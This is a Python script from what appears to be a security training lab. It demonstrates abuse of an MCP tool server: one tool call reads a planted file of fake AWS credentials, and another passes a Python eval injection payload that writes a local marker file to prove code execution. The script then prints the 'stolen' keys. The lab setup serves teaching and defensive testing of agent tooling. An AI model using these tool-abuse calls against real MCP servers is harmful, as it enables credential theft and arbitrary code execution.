#!/usr/bin/env python3
from __future__ import annotations

import asyncio
import importlib.util
import json
import os
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.dont_write_bytecode = True

from dojo_app.barryflights_mcp_server import (
    FAKE_AWS_ACCESS_KEY,
    FAKE_AWS_SECRET_KEY,
    FAKE_AWS_SESSION_TOKEN,
)
from dojo_app.lab_output import print_status


STATE = ROOT / ".lab-state" / "darkside"
MCP_SCRIPT = ROOT / "samples" / "mcp" / "workspace-admin-bridge.py"


def ensure_mcp_runtime() -> None:
    if importlib.util.find_spec("mcp") is not None:
        return

    venv_python = ROOT / ".venv" / "bin" / "python"
    if venv_python.exists() and Path(sys.executable) != venv_python:
        os.execv(str(venv_python), [str(venv_python), __file__, *sys.argv[1:]])

    raise RuntimeError("MCP dependency is missing. Install requirements.txt first.")


def fake_aws_credentials() -> str:
    return "\n".join(
        [
            "[vibe-coding-lab]",
            f"aws_access_key_id = {FAKE_AWS_ACCESS_KEY}",
            f"aws_secret_access_key = {FAKE_AWS_SECRET_KEY}",
            f"aws_session_token = {FAKE_AWS_SESSION_TOKEN}",
            "",
        ]
    )


def relative(path: Path) -> str:
    try:
        return str(path.relative_to(ROOT))
    except ValueError:
        return str(path)


def result_text(result: Any) -> str:
    parts = []
    for item in getattr(result, "content", None) or []:
        text = getattr(item, "text", "")
        if text:
            parts.append(text)
    return "\n".join(parts)


async def run_mcp_calls(creds_path: Path, rce_marker: Path) -> tuple[list[str], str]:
    from mcp import ClientSession
    from mcp.client.stdio import StdioServerParameters, stdio_client

    params = StdioServerParameters(
        command=sys.executable,
        args=[str(MCP_SCRIPT)],
        cwd=str(ROOT),
    )

    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            listed = await session.list_tools()
            tool_names = sorted(tool.name for tool in listed.tools)

            secret_result = await session.call_tool(
                "read_runtime_config",
                {"path": str(creds_path)},
            )
            await session.call_tool(
                "score_template_expression",
                {
                    "expression": (
                        "__import__('pathlib').Path(%r).write_text('mcp eval executed')"
                        % str(rce_marker)
                    )
                },
            )

    return tool_names, result_text(secret_result)


def main() -> int:
    ensure_mcp_runtime()
    STATE.mkdir(parents=True, exist_ok=True)
    creds_path = STATE / "fake-home" / ".aws" / "credentials"
    creds_path.parent.mkdir(parents=True, exist_ok=True)
    creds_path.write_text(fake_aws_credentials(), encoding="utf-8")

    stolen_path = STATE / "mcp-secret-read.json"
    rce_marker = STATE / "mcp-rce-demo.txt"
    stolen_path.unlink(missing_ok=True)
    rce_marker.unlink(missing_ok=True)

    tool_names, secret_text = asyncio.run(run_mcp_calls(creds_path, rce_marker))
    secret = json.loads(secret_text)
    stolen_path.write_text(json.dumps(secret, indent=2, sort_keys=True), encoding="utf-8")

    print_status("DARKSIDE_MCP_ABUSE=pass")
    print("mcp_transport=stdio")
    print("mcp_tools=" + ",".join(tool_names))
    print("mcp_tool=read_runtime_config")
    print(f"stolen_file={relative(creds_path)}")
    print(f"stolen_report={relative(stolen_path)}")
    for line in secret.get("content", "").splitlines():
        if line.startswith("aws_"):
            print(line)
    print("mcp_tool=score_template_expression")
    print(f"rce_marker={relative(rce_marker)}")
    print_status("MCP_CODE_EXECUTION=local-file-written")
    return 0 if rce_marker.exists() else 1


if __name__ == "__main__":
    raise SystemExit(main())
